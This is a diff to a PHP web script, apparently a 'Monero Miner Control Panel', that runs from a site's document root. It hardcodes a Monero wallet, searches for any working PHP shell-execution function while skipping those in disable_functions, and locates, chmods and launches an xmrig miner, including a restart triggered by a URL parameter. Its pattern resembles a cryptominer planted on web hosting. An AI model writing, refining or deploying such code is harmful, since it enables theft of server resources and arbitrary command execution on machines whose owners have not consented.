@@ -1,4 +1,12 @@
 <?php
+error_reporting(E_ALL);
+ini_set('display_errors', '1');
+@ini_set('output_buffering', 'Off');
+@ini_set('zlib.output_compression', '0');
+@ini_set('implicit_flush', '1');
+while (ob_get_level()) ob_end_clean();
+header('Content-Type: text/html; charset=utf-8');
+
 // Set default Monero address
  $defaultAddress = "83c4H4wjx8qLTqpUUGdCQE9hM2SwxcukTLFd29PtUrWpby4CXohXYoLQBBrwpYrDfUapxAgenNr2iG847x7wRazPH2RH6nm";
 
@@ -8,17 +16,9 @@
 // --- Helper Functions ---
 
 /**
- * Checks if a command exists on the system.
+ * Gets the working command execution function (cached).
  */
-function isCommandAvailable($command) {
-    $output = shell_exec("command -v " . escapeshellarg($command));
-    return !empty(trim($output));
-}
-
-/**
- * Executes a shell command using the best available method.
- */
-function executeCommand($command) {
+function getWorkingExecFunction() {
     static $workingFunction = null;
     if ($workingFunction === null) {
         $testCommand = 'echo test';
@@ -31,13 +31,34 @@ function executeCommand($command) {
         ];
         foreach ($functions_to_test as $name => $func) {
             if (function_exists($name) && !in_array($name, array_map('trim', explode(',', ini_get('disable_functions'))))) {
-                $output = trim($func($testCommand));
-                if ($output === 'test') { $workingFunction = $func; break; }
+                try {
+                    $output = trim($func($testCommand));
+                    if ($output === 'test') { $workingFunction = $func; break; }
+                } catch (Exception $e) {
+                    continue;
+                }
             }
         }
         if ($workingFunction === null) { die("FATAL ERROR: No working command execution function found."); }
     }
-    return $workingFunction($command . ' 2>&1');
+    return $workingFunction;
+}
+
+/**
+ * Checks if a command exists on the system.
+ */
+function isCommandAvailable($command) {
+    $func = getWorkingExecFunction();
+    $output = $func("command -v " . escapeshellarg($command) . ' 2>&1');
+    return !empty(trim($output));
+}
+
+/**
+ * Executes a shell command using the best available method.
+ */
+function executeCommand($command) {
+    $func = getWorkingExecFunction();
+    return $func($command . ' 2>&1');
 }
 
 /**
@@ -65,12 +86,12 @@ function findExistingInstallationPath() {
     $homeEnv = trim(executeCommand('printenv HOME'));
     if (!empty($homeEnv)) {
         $path = $homeEnv . '/moneroocean';
-        if (is_dir($path)) return $path;
+        if (is_dir($path) && file_exists($path . '/xmrig')) return $path;
     }
     // FIXED: Use a dynamic path instead of a hardcoded one.
     $baseDir = dirname($_SERVER['DOCUMENT_ROOT']);
     $path = $baseDir . '/tmp/xmrig-6.24.0';
-    if (is_dir($path)) return $path;
+    if (is_dir($path) && file_exists($path . '/xmrig')) return $path;
     return false;
 }
 
@@ -154,7 +175,10 @@ function startMiner($path) {
     }
 }
 
-// --- HTML Start ---
+/**
+ * Outputs the HTML header and styles.
+ */
+function outputHtmlHeader() {
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -198,41 +222,44 @@ function startMiner($path) {
         <h1>🚀 Monero Miner Control Panel</h1>
         <p>Automated Setup and Management</p>
     </div>
-
 <?php
+} // End of outputHtmlHeader function
 
 // --- Main Logic ---
 
+outputHtmlHeader();
+
 // FIXED: Re-added the improved restart logic.
 if (isset($_GET['restart'])) {
-    echo "<div class='card status-info'>";
-    echo "<h2 class='card-title'><span class='icon'>🔄</span> Restart Requested</h2>";
     $minerPath = findExistingInstallationPath();
     if ($minerPath) {
-        echo "<p>Found installation at <code>" . htmlspecialchars($minerPath) . "</code>.</p>";
-        echo "<h3>Step 1: Checking Permissions</h3>";
         executeCommand("chmod +x '$minerPath/xmrig'");
-        echo "<p>✅ Set execute permissions on xmrig.</p>";
-        echo "<h3>Step 2: Starting Miner</h3>";
         $logFile = $minerPath . '/bot.log';
         if(file_exists($logFile)) unlink($logFile);
         startMiner($minerPath);
-        echo "<p style='color: blue;'>🚀 Start command executed. Waiting for process to initialize...</p>";
-        echo "<h3>Step 3: Checking for Errors</h3>";
-        sleep(3);
-        flush(); ob_flush();
-        if (file_exists($logFile) && filesize($logFile) > 0) {
-            $logContent = file_get_contents($logFile);
-            echo "<p style='color: var(--danger-color);'>⚠️ The miner process may have failed to start. Check the log output below:</p>";
-            echo "<pre>" . htmlspecialchars($logContent) . "</pre>";
+        sleep(2);
+        $started = !empty(trim(executeCommand("ps aux | grep '[x]mrig'")));
+        echo "<div class='card status-info'>";
+        echo "<h2 class='card-title'><span class='icon'>🔄</span> Restart Complete</h2>";
+        echo "<p>Found installation at <code>" . htmlspecialchars($minerPath) . "</code>.</p>";
+        if ($started) {
+            echo "<p style='color: var(--success-color);'>✅ Miner process started successfully!</p>";
         } else {
-            echo "<p style='color: var(--success-color);'>✅ No immediate errors found in log file.</p>";
+            echo "<p style='color: var(--warning-color);'>⚠️ Miner start command executed, but process may need a moment to initialize.</p>";
+            if (file_exists($logFile) && filesize($logFile) > 0) {
+                echo "<h3>Log Output:</h3>";
+                echo "<pre>" . htmlspecialchars(file_get_contents($logFile)) . "</pre>";
+            }
         }
-        echo "<p><a href='?' class='button button-success'>Refresh Page to Check Status</a></p>";
+        echo "<p><a href='?' class='button button-success'>View Status</a></p>";
+        echo "</div></body></html>";
     } else {
-        echo "<p style='color:red;'>❌ Could not find an existing installation to restart.</p>";
+        echo "<div class='card status-error'>";
+        echo "<h2 class='card-title'><span class='icon'>❌</span> No Installation Found</h2>";
+        echo "<p>Could not find an existing installation to restart.</p>";
+        echo "<p><a href='?' class='button button-success'>Install Fresh</a></p>";
+        echo "</div></body></html>";
     }
-    echo "</div></body></html>";
     exit;
 }
 
